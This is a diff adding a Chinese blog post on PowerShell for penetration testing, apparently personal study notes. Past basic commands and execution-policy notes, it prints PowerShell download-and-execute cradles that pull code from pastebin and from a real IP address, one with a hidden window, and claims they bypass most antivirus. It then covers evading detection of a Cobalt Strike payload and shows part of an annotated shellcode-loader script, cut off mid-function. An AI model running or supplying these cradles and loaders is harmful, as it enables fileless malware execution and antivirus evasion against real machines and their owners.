@@ -1,0 +1,896 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Powershell基础基本 windows下的cat  1type    删除文件 1del &#x2F;f(强制)  复制文件 1copy    移动文件  1move     查看进程 1tasklist  查看系统的版本 1systenminfo  运行powersehll 本地运行 12powershell -ep bypass -f .\test.ps1powersehll -f test.ps">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Powershell渗透框架">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/04/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="Powershell基础基本 windows下的cat  1type    删除文件 1del &#x2F;f(强制)  复制文件 1copy    移动文件  1move     查看进程 1tasklist  查看系统的版本 1systenminfo  运行powersehll 本地运行 12powershell -ep bypass -f .\test.ps1powersehll -f test.ps">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204194413264.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200517158.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200602845.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200655048.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204201342883.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204210637416.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204212151352.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204212157993.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213047614.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213230648.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213515374.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213717999.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213841205.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204221142381.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204223822204.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204224023599.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204224210497.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204225409570.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204231220345.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002854574.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002917599.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002952278.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205003034363.png">
+<meta property="og:image" content="d:\hexo\source_posts\%E6%B8%97%E9%80%8F\Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6.assets\image-20240205003150450.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205003509499.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004120288.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004205077.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004237370.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004824420.png">
+<meta property="article:published_time" content="2024-02-04T11:35:02.000Z">
+<meta property="article:modified_time" content="2024-02-04T16:53:22.290Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204194413264.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Powershell渗透框架 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Powershell渗透框架"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-04 19:35" pubdate>
+          February 4, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          99 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Powershell渗透框架</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h1><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><ol>
+<li><p>windows下的cat </p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204194413264.png" srcset="/img/loading.gif" lazyload alt="image-20240204194413264"></p>
+</li>
+<li><p>删除文件</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">del</span> /<span class="hljs-function"><span class="hljs-title">f</span>(强制)</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>复制文件</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">copy</span><br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>移动文件 </p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">move <br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查看进程</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">tasklist</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看系统的版本</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systenminfo</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="运行powersehll"><a href="#运行powersehll" class="headerlink" title="运行powersehll"></a>运行powersehll</h2><ol>
+<li><p>本地运行</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">powershell -ep bypass -f .\<span class="hljs-keyword">test</span>.ps1<br>powersehll -f <span class="hljs-keyword">test</span>.ps1<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>远程运行</p>
+<p>可以绕过绝大多数的杀毒软件</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#x27;https://pastebin.com/raw/M676F14U&#x27;)&quot;</span><br>powershell -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#x27;http://139.155.49.43:8000/cmd&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>把远程url下载到内存里的字符串当作powersehll 脚本执行</p>
+<p>现在来做演示</p>
+<p>使用<a target="_blank" rel="noopener" href="https://pastebin.com/">Pastebin.com - #1 paste tool since 2002!</a>挂载代码</p>
+<p>粘贴文件创建文件然后出现下面这个</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200517158.png" srcset="/img/loading.gif" lazyload alt="image-20240204200517158"></p>
+<p>生成了一个这个界面之后，点击raw </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200602845.png" srcset="/img/loading.gif" lazyload alt="image-20240204200602845"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200655048.png" srcset="/img/loading.gif" lazyload alt="image-20240204200655048"></p>
+<p>就发现成功的执行了，但是实际上一般都是放到vps 上面，然后开启一个 http.server 的服务，就可以成功的访问了</p>
+</li>
+</ol>
+<h2 id="执行策略-面试"><a href="#执行策略-面试" class="headerlink" title="执行策略(面试)"></a>执行策略(面试)</h2><ol>
+<li><p>查看当前的执行策略</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ExecutionPolicy</span>  <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看所有的执行策略</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ExecutionPolicy -list</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204201342883.png" srcset="/img/loading.gif" lazyload alt="image-20240204201342883"></p>
+</li>
+<li><p>执行策略</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>AllSigned</strong></td>
+<td>允许执行所有具有数字签名的脚本</td>
+</tr>
+<tr>
+<td><strong>Bypass</strong></td>
+<td>不阻止任何操作，并且没有任何警告或者提示</td>
+</tr>
+<tr>
+<td>Default</td>
+<td>设置默认执行策略。Restricted 适用于 Windows 客户端。为 Windows 服务器远程签名。</td>
+</tr>
+<tr>
+<td>RemoteSigned</td>
+<td>允许执行具有数字签名的通过网络下载的脚本；本地创建的脚本不要求脚本具有数字签名，可以直接执行。</td>
+</tr>
+<tr>
+<td>Restricted</td>
+<td>受限制的，可以执行单个的命令，但不能执行脚本，执行就会报错，Windows  8,Windows 8.1,Windows Server 2012中默认策略。</td>
+</tr>
+<tr>
+<td>Undeﬁned</td>
+<td>Undeﬁned 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略</td>
+</tr>
+<tr>
+<td><strong>Unrestricted</strong></td>
+<td>允许运行未签名的脚本。从网络上下载的脚本，在运行前会进行安全性提示。需要确认是否执行脚本。</td>
+</tr>
+</tbody></table>
+<p>注意几个完全可以执行文件的策略</p>
+</li>
+</ol>
+<h2 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h2><ol>
+<li><p>远程直接加载（免杀）</p>
+<p>很重要，因为无文件落地</p>
+</li>
+<li><p>添加参数</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-ep</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="无内存加载"><a href="#无内存加载" class="headerlink" title="无内存加载"></a>无内存加载</h2><ol>
+<li><p>使用前面提到的远程加载</p>
+</li>
+<li><p>使用cs<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204210637416.png" srcset="/img/loading.gif" lazyload alt="image-20240204210637416"></p>
+<p>为了能免杀通过我们可以尝试做一下免杀，但是现在这些免杀技巧都是不能使用的</p>
+<p>尝试获取它默认的payload</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204212151352.png" srcset="/img/loading.gif" lazyload alt="image-20240204212151352"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204212157993.png" srcset="/img/loading.gif" lazyload alt="image-20240204212157993"></p>
+<p>首先改一下</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213047614.png" srcset="/img/loading.gif" lazyload alt="image-20240204213047614"></p>
+<p>先改成echo </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213230648.png" srcset="/img/loading.gif" lazyload alt="image-20240204213230648"></p>
+<p>查看加密之后的是什么</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213515374.png" srcset="/img/loading.gif" lazyload alt="image-20240204213515374"></p>
+<p>将输入导入新的文件，将添加echo的文件添加</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213717999.png" srcset="/img/loading.gif" lazyload alt="image-20240204213717999"></p>
+<p>查看cs2</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213841205.png" srcset="/img/loading.gif" lazyload alt="image-20240204213841205"></p>
+<p>发现就是一个简单加载bin文件的一个脚本，之所以会被查杀，就是因为bin文件里面有特征码</p>
+<p>如果我们可以直接加载文件，而不是以字符串的形式就可以了</p>
+<p>具体的过程是，先加载</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://139.155.49.43:8088/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是一般使用下面这个</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://139.155.49.43:8088/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p> cs1.ps</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 启用 PowerShell 的严格模式，并设置版本为 2</span><br><span class="hljs-comment"># 强制要求变量在使用之前必须先声明，并且不允许使用未定义的属性、方法和变量等。</span><br><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-comment"># 定义func_get_proc_address函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address</span></span> &#123;<br>    <span class="hljs-comment"># 函数接收两个参数，$var_module表示要加载函数的DLL库名称，$var_procedure 表示要查找的函数名称。</span><br>    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>)<br>    <span class="hljs-comment"># 通过GetAssemblies()方法获取当前应用程序域中已加载的所有程序集，然后使用Where-Object过滤出所有在全局程序集缓存中且名称为System.dll的程序集。</span><br>    <span class="hljs-comment"># 从 System.dll 中加载 Microsoft.Win32.UnsafeNativeMethods 类</span><br>    <span class="hljs-comment"># 使用GetType()方法从Microsoft.Win32.UnsafeNativeMethods类中获取一个表示GetProcAddress()方法的MethodInfo对象</span><br>    <span class="hljs-variable">$var_unsafe_native_methods</span> = ([<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies() | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)<br>    <span class="hljs-comment"># 使用GetType()方法从Microsoft.Win32.UnsafeNativeMethods类中获取一个表示GetProcAddress()方法的MethodInfo对象并获取 GetProcAddress 方法。</span><br>    <span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>))<br>    <span class="hljs-comment"># 然后通过调用该对象的Invoke()方法，获取函数地址。</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))<br>&#125;<br><br><span 